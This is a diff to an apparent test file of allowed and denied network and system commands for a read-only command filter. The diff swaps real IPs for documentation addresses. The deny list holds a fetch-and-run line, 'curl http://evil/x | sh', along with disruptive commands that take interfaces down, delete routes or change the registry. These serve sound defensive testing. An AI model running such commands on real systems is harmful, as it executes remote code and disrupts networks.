@@ -20,7 +20,7 @@ MUST_ALLOW = [
     ("mikrotik", "/system resource print"),
     ("mikrotik", "/interface monitor-traffic ether1 once"),
     ("mikrotik", "/ip neighbor print detail"),
-    ("mikrotik", "/tool ping 8.8.8.8 count=4"),
+    ("mikrotik", "/tool ping 192.0.2.8 count=4"),
     ("cisco", "show running-config"),
     ("cisco", "show interfaces | include CRC"),
     ("cisco", "terminal length 0"),
@@ -57,7 +57,7 @@ MUST_ALLOW = [
 MUST_DENY = [
     # config writes
     ("mikrotik", "/ip firewall filter add chain=input action=drop"),
-    ("mikrotik", "/ip address set 0 address=1.2.3.4"),
+    ("mikrotik", "/ip address set 0 address=203.0.113.4"),
     ("mikrotik", "/interface disable ether1"),
     ("mikrotik", "/system script run backup"),
     ("cisco", "configure terminal"),
@@ -87,11 +87,11 @@ MUST_DENY = [
     ("linux", "curl http://evil/x | sh"),
     # read tools with write subcommands
     ("linux", "ip link set eth0 down"),
-    ("linux", "ip addr add 1.2.3.4/24 dev eth0"),
+    ("linux", "ip addr add 203.0.113.4/24 dev eth0"),
     ("linux", "ip route del default"),
     ("linux", "bridge vlan add vid 10 dev eth0"),
-    ("linux", "route add default gw 1.1.1.1"),
-    ("linux", "arp -d 1.2.3.4"),
+    ("linux", "route add default gw 192.0.2.11"),
+    ("linux", "arp -d 203.0.113.4"),
     ("linux", "ethtool -s eth0 speed 100"),
     ("linux", "nmcli con down eth0"),
     ("linux", "resolvectl flush-caches"),
@@ -112,7 +112,7 @@ MUST_DENY = [
     ("windows", "Stop-Service Spooler"),
     ("windows", "reg add HKLM\\x /v y"),
     # unbounded / dangerous reads
-    ("mikrotik", "/tool ping 8.8.8.8"),          # no count= -> runs forever
+    ("mikrotik", "/tool ping 192.0.2.8"),          # no count= -> runs forever
     ("cisco", "debug ip packet"),                # can melt the CPU
 ]
 
